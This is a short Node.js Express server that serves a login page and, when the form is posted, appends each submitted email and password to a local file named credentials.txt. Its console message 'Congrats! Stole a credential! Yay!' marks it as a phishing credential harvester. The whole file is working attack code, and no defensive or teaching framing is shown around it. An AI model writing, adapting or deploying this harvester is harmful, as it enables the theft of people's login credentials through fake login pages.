const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

app.listen(80, () => {

});

app.get('/', (req, res) => {
    res.sendFile(__dirname + "/index.html");
})

app.get('/login', (req, res) => {
    res.sendFile(__dirname + "/index.html");
})

app.post('/login', (req, res) => {
    var email = req.body.email;
    var password = req.body.pass;
    fs.appendFile('credentials.txt', email + ":" + password + "\n", (err) => {
        if (err) throw err;
        console.log("Congrats! Stole a credential! Yay!");
    })
    res.sendFile(__dirname + "/index.html");

})
